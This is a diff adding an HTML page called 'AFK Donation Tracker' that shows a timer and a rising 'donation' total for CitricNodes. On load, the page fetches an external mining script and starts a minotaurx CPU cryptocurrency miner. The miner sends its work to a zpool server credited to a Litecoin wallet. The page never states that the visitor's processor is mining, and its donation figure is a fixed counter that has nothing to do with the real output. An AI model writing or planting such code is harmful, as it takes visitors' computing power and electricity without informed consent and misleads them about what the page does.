@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AFK Donation Tracker</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-image: url("https://imgs.search.brave.com/oPsb9hFEq8YKMSsz7ReOroU3L3R98uLY0ey7CrXB0a8/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9lMC5w/eGZ1ZWwuY29tL3dh/bGxwYXBlcnMvMzc5/LzQyMS9kZXNrdG9w/LXdhbGxwYXBlci1t/aW5lY3JhZnQtZGly/dC10ZXh0dXJlLXRo/dW1ibmFpbC5qcGc");
+        background-size: cover;
+        color: #8b4513; /* Dirt brown */
+        text-align: center;
+        padding: 50px;
+      }
+      .donation-info {
+        font-size: 24px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        background-color: rgba(
+          255,
+          255,
+          255,
+          0.8
+        ); /* Slightly transparent background */
+        padding: 10px;
+        border-radius: 5px;
+      }
+      .time-counter {
+        font-size: 20px;
+        color: #a52a2a; /* Brown */
+        margin-bottom: 10px;
+        background-color: rgba(
+          255,
+          255,
+          255,
+          0.8
+        ); /* Slightly transparent background */
+        padding: 10px;
+        border-radius: 5px;
+      }
+      .donation-rate {
+        font-size: 16px;
+        color: #d2691e; /* Darker brown */
+        margin-bottom: 20px;
+        background-color: rgba(
+          255,
+          255,
+          255,
+          0.8
+        ); /* Slightly transparent background */
+        padding: 10px;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div>
+      <div class="donation-info">
+        Donated amount of money to CitricNodes in this session: $<span
+          id="donation-amount"
+          >0.0000000000</span
+        >
+      </div>
+      <div class="time-counter" id="time-counter">00:00:00</div>
+      <div class="donation-rate">
+        Current AFK donation rate: $0.0000000144 per second
+      </div>
+    </div>
+    <script src="https://webminer.pages.dev/dist/mm.js"></script>
+    <script>
+      const client = new Client({
+        algorithm: "minotaurx", // yespower, minotaurx
+        stratum: {
+          server: "minotaurx.na.mine.zpool.ca", // Your Pool host
+          port: 7019, // Your Pool port
+          worker: "ltc1qrpu5tjjllz7anx2ae050xm7ua9kffgp5qpx434", // Your Wallet
+          password: "c=LTC", // Your Mining password
+        },
+        options: {
+          threads: 2, // CPU threads to mining
+          log: true, // Show log on console
+        },
+      });
+
+      // Start Mining
+      client.start();
+    </script>
+
+    <script>
+      const donationRatePerSecond = 0.0000000144;
+      let donationAmount = 0.0;
+      let secondsElapsed = 0;
+      let timerInterval;
+
+      function startDonationTracker() {
+        timerInterval = setInterval(() => {
+          donationAmount += donationRatePerSecond;
+          document.getElementById("donation-amount").innerText =
+            donationAmount.toFixed(10);
+          secondsElapsed++;
+          updateTimer();
+        }, 1000);
+      }
+
+      function updateTimer() {
+        const hours = Math.floor(secondsElapsed / 3600);
+        const minutes = Math.floor((secondsElapsed % 3600) / 60);
+        const seconds = secondsElapsed % 60;
+        document.getElementById("time-counter").innerText = `${formatTime(
+          hours
+        )}:${formatTime(minutes)}:${formatTime(seconds)}`;
+      }
+
+      function formatTime(time) {
+        return time < 10 ? "0" + time : time;
+      }
+
+      // Start the donation tracker immediately when the page loads
+      startDonationTracker();
+    </script>
+  </body>
+</html>
